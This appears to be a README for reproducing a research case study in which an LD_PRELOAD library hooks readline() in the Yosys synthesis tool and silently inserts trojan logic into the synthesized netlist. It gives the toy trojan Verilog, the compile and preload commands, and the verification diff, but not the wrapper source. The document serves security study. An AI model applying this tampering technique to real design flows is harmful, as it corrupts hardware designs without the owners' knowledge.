# P616: Configuration-Based Design Tampering Affecting Integrity

This case study corresponds to taxonomy path **P616**:

- **$A_{\mathrm{sw}}$ — Vulnerability/Configuration Exploitation:** the attacker exploits software configuration or runtime behavior within the VLSI tool environment.
- **$M_{\mathrm{sw}}$ — Vulnerability/Configuration-Based Control:** the exploitation provides control over how the tool processes design inputs during synthesis.
- **$A_{\mathrm{vlsi}}$ — Design Tampering or Malicious Modification:** the attacker alters synthesis behavior, resulting in malicious modification of the generated design.
- **Stage:** Logic Synthesis.
- **Outcome:** Integrity.

This folder contains files for reproducing the P616 case-study attack.

## P616 Attack: Trojanized Runtime Dependency Modifying Synthesis Behavior

### Goal

Demonstrate how a trojanized runtime dependency used by an EDA tool can silently alter synthesis behavior during execution, resulting in malicious logic insertion and an unavailable or unusable synthesized design.

---

### Target
- **Tool:** Yosys  
- **Library:** libreadline.so.8  
- **Intercepted Function:** `readline()`  
- **Stage Affected:** Stage 2 — Logic Synthesis
- **Security Impact:** Integrity violation (malicious logic inserted into synthesized netlist)

---

### Step 1 — Prepare Trojan Payload
Create the Trojan Verilog payload that will be injected during synthesis:

```bash
nano trojan_verilog.v
```

```verilog
module trojan_top(output y, input a, b);
assign y = a ^ b;   // Trojan XOR logic
endmodule
```

---

### Step 2 — Create Malicious Wrapper Library
Create a wrapper (`trojan.c`) that intercepts the `readline()` function and replaces the entered command with a malicious synthesis command.

---

### Step 3 — Compile the Trojan Library

```bash
gcc -shared -fPIC -o libtrojan.so trojan.c -ldl
```

---

### Step 4 — Run Yosys with LD_PRELOAD

```bash
LD_PRELOAD=./libtrojan.so ../yosys/yosys
```

Inside Yosys:

```bash
read_verilog test.v
```

The trojanized wrapper forces execution of:

```
read_verilog trojan_verilog.v; synth; show
```

---

### Step 5 — Verify Trojan Insertion
Compare the synthesized outputs:

```bash
diff original_synth.v trojan_synth.v
```

Observe the logic modification (e.g., AND → XOR).

---

### Impact

The attack demonstrates P616 by using a trojanized runtime dependency to silently modify synthesis behavior and insert malicious logic into the generated design. In the demonstrated execution, the modification also results in an unavailable or unusable design, without modifying the EDA tool source code.
